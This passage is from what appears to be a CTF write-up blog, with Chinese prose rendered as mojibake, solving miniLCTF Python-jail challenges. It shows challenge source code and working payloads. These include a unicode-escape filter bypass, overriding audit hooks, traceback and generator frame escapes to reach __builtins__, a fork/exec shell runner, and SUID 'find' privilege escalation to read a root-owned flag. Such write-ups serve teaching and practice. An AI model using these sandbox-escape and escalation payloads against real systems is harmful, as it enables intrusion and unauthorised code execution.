class="line">    result_queue = multiprocessing.Queue()</span><br><span class="line">    p = multiprocessing.Process(target=sandbox_executor, args=(code, result_queue))</span><br><span class="line">    p.start()</span><br><span class="line">    p.join(timeout=timeout)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> p.is_alive():</span><br><span class="line">        p.terminate()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout: code took too long to run.&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        status, output = result_queue.get_nowait()</span><br><span class="line">        <span class="keyword">return</span> output <span class="keyword">if</span> status == <span class="string">&quot;ok&quot;</span> <span class="keyword">else</span> <span class="string">f&quot;Error: <span class="subst">&#123;output&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error: no output from sandbox.&quot;</span></span><br><span class="line"></span><br><span class="line">CODE = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def my_audit_checker(event,args):</span></span><br><span class="line"><span class="string">    allowed_events = [&quot;import&quot;, &quot;time.sleep&quot;, &quot;builtins.input&quot;, &quot;builtins.input/result&quot;]</span></span><br><span class="line"><span class="string">    if not list(filter(lambda x: event == x, allowed_events)):</span></span><br><span class="line"><span class="string">        raise Exception</span></span><br><span class="line"><span class="string">    if len(args) &gt; 0:</span></span><br><span class="line"><span class="string">        raise Exception</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">addaudithook(my_audit_checker)</span></span><br><span class="line"><span class="string">print(&quot;&#123;&#125;&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">badchars = <span class="string">&quot;\&quot;&#x27;|&amp;`+-*/()[]&#123;&#125;_.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/execute&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute</span>():</span><br><span class="line">    text = request.form[<span class="string">&#x27;text&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> badchars:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> text:</span><br><span class="line">            <span class="keyword">return</span> Response(<span class="string">&quot;Error&quot;</span>, status=<span class="number">400</span>)</span><br><span class="line">    output=safe_exec(CODE.<span class="built_in">format</span>(text))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(output)&gt;<span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&quot;Error&quot;</span>, status=<span class="number">400</span>)</span><br><span class="line">    <span class="keyword">return</span> Response(output, status=<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><code>CODE.format(text)</code>å°†<code>text</code>æ›¿æ¢åˆ°<code>&#123;&#125;</code>ï¼Œç­‰ä»·äº<code>print(&quot;text&quot;)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">text=&quot;)</span><br><span class="line">#è¿™é‡Œæ‰§è¡Œä»£ç </span><br><span class="line">print(&quot;</span><br></pre></td></tr></table></figure>

<p>å°±å¯ä»¥æ‰§è¡Œä»£ç äº†ï¼Œç„¶åè¦ç»•<code>badchars</code>ï¼Œ<code>safe_exec</code>ä¸­<code>code = code.encode().decode(&#39;unicode_escape&#39;)</code></p>
<p>unicode_escapeä¼šè§£æ Unicode è½¬ä¹‰åºåˆ—ï¼Œåªéœ€è¦<strong>å°†textçš„å€¼unicodeç¼–ç </strong>ï¼Œåœ¨safe_execä¸­å°±ä¼šè¿˜åŸå›åŸå­—ç¬¦ï¼ˆå°±æ˜¯ç¼–ç è§£ç ä¸ä¸€è‡´è¿˜æ˜¯åœ¨badcharåè§£çš„ç ï¼‰</p>
<p>ç„¶åå°±æ˜¯å®¡è®¡é’©å­çš„ç»•è¿‡ï¼Œå°±å¾ˆç®€å•ä¸€æŸ¥å°±æœ‰å¼ºç½‘æ¯çš„é¢˜ï¼Œ<strong>é‡å†™listä¸lenæ–¹æ³•å°±è¡Œ</strong></p>
<p>ç„¶åå°±æ˜¯astçš„ç»•è¿‡ï¼Œç¦æ­¢äº†<strong>ç”Ÿæˆå™¨</strong>ä¸ä¸€äº›<strong>é­”æœ¯å±æ€§ä¸æ–¹æ³•</strong>ï¼Œç„¶åå°±ä¸èƒ½ç”Ÿæˆå™¨æ ˆå¸§é€ƒé€¸ä¸ç»§æ‰¿é“¾åº”è¯¥ä¹Ÿä¸å¤ªè¡Œçš„é€š</p>
<p>æå‡è·ŸExceptionæœ‰å…³ï¼Œä¸€æŸ¥åº”è¯¥éƒ½èƒ½æŸ¥å‡ºæ¥ï¼Œ<strong>å¼‚å¸¸æ ˆå¸§é€ƒé€¸</strong>(æœ‰å¾ˆå¤šæ–¹æ³•å§ï¼Œæˆ‘è§‰å¾—è¿™ä¸ªæœ€å¥½æŸ¥ï¼Ÿæ‰€ä»¥æå‡ç»™äº†å¯èƒ½ï¼Ÿ)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    1/0</span><br><span class="line">except Exception as e:</span><br><span class="line">    frame = e.__traceback__.tb_frame.f_back</span><br><span class="line">    builtins = frame.f_globals[&#x27;__builtins__&#x27;]</span><br></pre></td></tr></table></figure>

<p><code>e.__traceback__</code> â†’ æŒ‡å‘å¼‚å¸¸å‘ç”Ÿæ—¶çš„ <strong>traceback</strong> å¯¹è±¡</p>
<p>traceback é‡ŒåŒ…å« <code>tb_frame</code> â†’ æŒ‡å‘å¼‚å¸¸å‘ç”Ÿçš„ <strong>æ ˆå¸§ frame å¯¹è±¡</strong></p>
<p>frame é‡ŒåŒ…å« <code>f_locals</code>ã€<code>f_globals</code>ã€<code>f_back</code> â†’ å¯ä»¥æ²¿ç€é“¾æ¡è®¿é—®ä¹‹å‰çš„å±€éƒ¨å˜é‡ã€å…¨å±€å˜é‡ã€è°ƒç”¨æ ˆ</p>
<p>å¯ä»¥é€ƒé€¸åˆ°execå¤–çš„å…¨å±€æ‹¿<code>__builtins__</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">text=<span class="string">&quot;)</span></span><br><span class="line"><span class="string">list=lambda x:True</span></span><br><span class="line"><span class="string">len=lambda x:False</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">try:</span></span><br><span class="line"><span class="string">    1/0</span></span><br><span class="line"><span class="string">except Exception as e:</span></span><br><span class="line"><span class="string">    frame = e.__traceback__.tb_frame.f_back</span></span><br><span class="line"><span class="string">    builtins = frame.f_globals[&#x27;__builtins__&#x27;]</span></span><br><span class="line"><span class="string">    builtins.exec(&quot;</span>builtins.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls / -al&gt;app.py&#x27;</span>)<span class="string">&quot;)    #è¿™é‡Œ__import__è¢«actæ‹¦äº†ï¼Œæ‰€ä»¥æ”¾æˆå­—ç¬¦ä¸²ä¸¢åˆ°execé‡Œï¼ˆä¹Ÿå¯ä»¥ç”¨__getattribute__è·å–__import__ï¼‰</span></span><br><span class="line"><span class="string">    #frame.f_globals[&#x27;SandboxVisitor&#x27;].visit_Attribute=lambda x,y:None  #é‡å†™visit_Attributeå</span></span><br><span class="line"><span class="string">    #builtins.__import__(&#x27;os&#x27;).system(&#x27;ls /&gt;app.py&#x27;) 					#ä¹Ÿok</span></span><br><span class="line"><span class="string">print(&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å¾—unicodeç¼–ç </span></span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰å¾ˆå¤šå…¶ä»–åšæ³•ï¼Œæ¯”å¦‚__getattribute__ç»•ï¼Œyeildå…³é”®å­—æ„é€ ç”Ÿæˆå™¨,  é—­åŒ…æ ˆå¸§é€ƒé€¸ï¼Œ __newobj__çš„__builtins__å±æ€§ï¼Œè¿™é¢˜ç›¸æ¯”pyjailæ¯”è¾ƒå¼€æ”¾ï¼Œç½‘ä¸ŠæŸ¥æŸ¥åº”è¯¥éƒ½èƒ½æŸ¥å‡ºæ¥</p>
<p>å› ä¸ºæœ‰len(output)&lt;&#x3D;5é™åˆ¶ï¼Œå¯ä»¥å½“æ²¡å›æ˜¾æ¥æ‰“(å†™app.pyæˆ–è€…åˆ›å»ºstaticç›®å½•å¾€é‡Œå†™)ï¼Œä¹Ÿå¯ä»¥ä¸€ç‚¹ä¸€ç‚¹è¯»</p>
<p>ç„¶åå½“å‰ç”¨æˆ·minilUseræ²¡æƒé™è¯»&#x2F;m1n1FL@Gï¼Œéœ€è¦ææƒï¼Œå¾ˆç®€å•suidææƒï¼Œ24çº§çš„ç½‘å®‰å¯¼è®ºå®éªŒä¹Ÿæœ‰è¿™å†…å®¹</p>
<p>æŸ¥çœ‹entrypoint.shå°±å¯ä»¥çŸ¥é“äº†findæœ‰suidæƒé™ï¼Œä¹Ÿå¯ä»¥<code>find / -perm -4000 -type f 2&gt;/dev/null</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$FLAG</span> &gt; /m1n1FL@G</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;\nNext, let&#x27;s tackle the more challenging misc/pyjail&quot;</span>&gt;&gt; /m1n1FL@G</span><br><span class="line"><span class="built_in">chmod</span> 600 /m1n1FL@G</span><br><span class="line"><span class="built_in">chown</span> root:root /m1n1FL@G</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> 4755 /usr/bin/find</span><br><span class="line"></span><br><span class="line">useradd -m minilUser</span><br><span class="line"><span class="built_in">export</span> FLAG=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">chmod</span> -R 777 /app</span><br><span class="line">su minilUser -c <span class="string">&quot;python /app/app.py&quot;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶å<code>find . -exec cat /m1* \; &gt;app.py</code></p>
<h2 id="PyJail-Misc"><a href="#PyJail-Misc" class="headerlink" title="PyJail-Misc"></a>PyJail-Misc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    source_code = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SandboxVisitor</span>(ast.NodeVisitor):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">visit_Attribute</span>(<span class="params">self, node</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(node.attr, <span class="built_in">str</span>) <span class="keyword">and</span> node.attr.startswith(<span class="string">&quot;__&quot;</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Access to private attributes is not allowed&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.generic_visit(node)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_exec</span>(<span class="params">code: <span class="built_in">str</span>, sandbox_globals=<span class="literal">None</span></span>):</span><br><span class="line">    original_stdout = sys.stdout</span><br><span class="line">    original_stderr = sys.stderr</span><br><span class="line"></span><br><span class="line">    sys.stdout = io.StringIO()</span><br><span class="line">    sys.stderr = io.StringIO()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sandbox_globals <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        sandbox_globals = &#123;</span><br><span class="line">            <span class="string">&quot;__builtins__&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>,</span><br><span class="line">                <span class="string">&quot;any&quot;</span>: <span class="built_in">any</span>,</span><br><span class="line">                <span class="string">&quot;len&quot;</span>: <span class="built_in">len</span>,</span><br><span class="line">                <span class="string">&quot;RuntimeError&quot;</span>: RuntimeError,</span><br><span class="line">                <span class="string">&quot;addaudithook&quot;</span>: sys.addaudithook,</span><br><span class="line">                <span class="string">&quot;original_stdout&quot;</span>: original_stdout,</span><br><span class="line">                <span class="string">&quot;original_stderr&quot;</span>: original_stderr</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tree = ast.parse(code)</span><br><span class="line">        SandboxVisitor().visit(tree)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exec</span>(code, sandbox_globals)</span><br><span class="line">        output = sys.stdout.getvalue()</span><br><span class="line"></span><br><span class="line">        sys.stdout = original_stdout</span><br><span class="line">        sys.stderr = original_stderr</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> output, sandbox_globals</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        sys.stdout = original_stdout</span><br><span class="line">        sys.stderr = original_stderr</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, sandbox_globals</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CODE = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def my_audit_checker(event, args):</span></span><br><span class="line"><span class="string">    blocked_events = [</span></span><br><span class="line"><span class="string">        &quot;import&quot;, &quot;time.sleep&quot;, &quot;builtins.input&quot;, &quot;builtins.input/result&quot;, &quot;open&quot;, &quot;os.system&quot;,</span></span><br><span class="line"><span class="string">         &quot;eval&quot;,&quot;subprocess.Popen&quot;, &quot;subprocess.call&quot;, &quot;subprocess.run&quot;, &quot;subprocess.check_output&quot;</span></span><br><span class="line"><span class="string">    ]</span></span><br><span class="line"><span class="string">    if event in blocked_events or event.startswith(&quot;subprocess.&quot;):</span></span><br><span class="line"><span class="string">        raise RuntimeError(f&quot;Operation not allowed: &#123;event&#125;&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">addaudithook(my_audit_checker)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Handler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.request.sendall(<span class="string">b&quot;Welcome to Interactive Pyjail!\n&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.request.sendall(<span class="string">b&quot;Rules: No import / No sleep / No input\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="variable language_">self</span>.request.sendall(<span class="string">b&quot;========= Server Source Code =========\n&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.request.sendall(source_code.encode() + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.request.sendall(<span class="string">b&quot;========= End of Source Code =========\n\n&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="variable language_">self</span>.request.sendall(<span class="string">b&quot;Failed to load source code.\n&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.request.sendall(<span class="built_in">str</span>(e).encode() + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.request.sendall(<span class="string">b&quot;Type your code line by line. Type &#x27;exit&#x27; to quit.\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        prefix_code = CODE</span><br><span class="line">        sandbox_globals = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="variable language_">self</span>.request.sendall(<span class="string">b&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                user_input = <span class="variable language_">self</span>.request.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> user_input:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> user_input.lower() == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">                    <span class="variable language_">self</span>.request.sendall(<span class="string">b&quot;Bye!\n&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(user_input) &gt; <span class="number">100</span>:</span><br><span class="line">                    <span class="variable language_">self</span>.request.sendall(<span class="string">b&quot;Input too long (max 100 chars)!\n&quot;</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                full_code = prefix_code + user_input + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                prefix_code = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">                result, sandbox_globals = safe_exec(full_code, sandbox_globals)</span><br><span class="line">                <span class="variable language_">self</span>.request.sendall(result.encode() + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="variable language_">self</span>.request.sendall(<span class="string">f&quot;Error occurred: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>\n&quot;</span>.encode())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">5000</span></span><br><span class="line">    <span class="keyword">with</span> socketserver.ThreadingTCPServer((HOST, PORT), Handler) <span class="keyword">as</span> server:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Server listening on <span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>&quot;</span>)</span><br><span class="line">        server.serve_forever()</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆå™¨æ ˆå¸§é€ƒé€¸ï¼š <a target="_blank" rel="noopener" href="https://www.cnblogs.com/gaorenyusi/p/18242719">https://www.cnblogs.com/gaorenyusi/p/18242719</a></p>
<p>æ‹¿åˆ°execå¤–éƒ¨globals, ç„¶åé‡å†™visit_Attribute</p>
<p>osæ¨¡å—æ²¡banå®Œå°±banäº†æœ€å¸¸è§çš„system,popen</p>
<p>å›æ˜¾å› ä¸ºæœ‰â€original_stdoutâ€: original_stdoutå¾ˆå®¹æ˜“è¯»å‡ºæ¥</p>
<p>é•¿åº¦100é™åˆ¶åªéœ€å°†ä»£ç å†™æˆ<code>exec(&quot;code&quot;)</code>, codeéƒ¨åˆ†æ‹¼æ¥å°±è¡Œ</p>
<p>ç„¶åflag.txtå‘Šè¯‰flagæœ€åä¿®æ”¹æ—¶é—´2025.5.1 findæ‰¾å°±è¡Œäº†ï¼ˆæˆ–è€…ç›´æ¥çœ‹start.shèƒ½çœ‹åˆ°flagåœ¨å“ªï¼‰flagä½ç½®ï¼š<code>/tmp/.\x0a\x0b\x00hidden/flagD</code></p>
<p><code>cat /tmp/.*/flagD</code>å°±è¡Œ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = (a.gi_frame.f_back.f_back <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [x <span class="keyword">for</span> x <span class="keyword">in</span> a][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">globals</span> = a.f_back.f_back.f_globals</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">globals</span>[<span class="string">&#x27;SandboxVisitor&#x27;</span>].visit_Attribute=<span class="keyword">lambda</span> x,y:<span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os=<span class="built_in">globals</span>[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys=<span class="built_in">globals</span>[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;sys&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">iter</span>=<span class="built_in">globals</span>[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">iter</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>=<span class="built_in">globals</span>[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">exec</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=<span class="string">&#x27;run_command = lambda cmd: ((lambda r, w, pid: ((pid == 0 and (os.close(r), os.dup2(w,&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a+=<span class="string">&#x27;original_stdout.fileno()),os.dup2(w, original_stdout.fileno()),os.execlp(&quot;/bin/sh&quot;, &quot;sh&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a+=<span class="string">&#x27;, &quot;-c&quot;, cmd) )) or (os.close(w), (output :=b&quot;&quot;.join(iter(lambda: os.read(r, 4096), b&quot;&quot;))&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a+=<span class="string">&#x27;.decode()),os.close(r), os.waitpid(pid, 0),output )[4] ))(*os.pipe(), os.fork()))&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(run_command(<span class="string">&quot;find / -type f -newermt &#x27;2025-05-01 00:00:00&#x27; ! -newermt &#x27;2025-05-02 00:00:00&#x27;&quot;</span>))</span><br><span class="line">/tmp/.\x0a\x0b\x00hidden/flagD</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(run_command(<span class="string">&#x27;cat /tmp/.*/flagD&#x27;</span>))</span><br><span class="line">miniLCTF&#123;Fl4G-GeNER4ted_In_M1niIctf2OZS_with_IOvE286&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå®é™…run_commandå°±æ˜¯</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">run_command = <span class="keyword">lambda</span> cmd: (</span><br><span class="line">    (<span class="keyword">lambda</span> r, w, pid: (</span><br><span class="line">        (pid == <span class="number">0</span> <span class="keyword">and</span> (</span><br><span class="line">            os.close(r),</span><br><span class="line">            os.dup2(w, sys.stdout.fileno()),</span><br><span class="line">            os.dup2(w, sys.stderr.fileno()),</span><br><span class="line">            os.execlp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd)</span><br><span class="line">        )) <span class="keyword">or</span> (</span><br><span class="line">            os.close(w),</span><br><span class="line">            (output := <span class="string">b&quot;&quot;</span>.join(<span class="built_in">iter</span>(<span class="keyword">lambda</span>: os.read(r, <span class="number">4096</span>), <span class="string">b&quot;&quot;</span>)).decode()),</span><br><span class="line">            os.close(r),</span><br><span class="line">            os.waitpid(pid, <span class="number">0</span>),</span><br><span class="line">            output</span><br><span class="line">        )[<span class="number">4</span>]</span><br><span class="line">    ))(*os.pipe(), os.fork())</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(run_command(<span class="string">&quot;ls&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>è¿˜å¯ä»¥ç”¨å…¶ä»–åº•å±‚çš„oså‡½æ•°</p>
<p>æ¯”å¦‚os.execvp os.forkpty os.spawnå¯ä»¥è‡ªå·±è¯•è¯•</p>
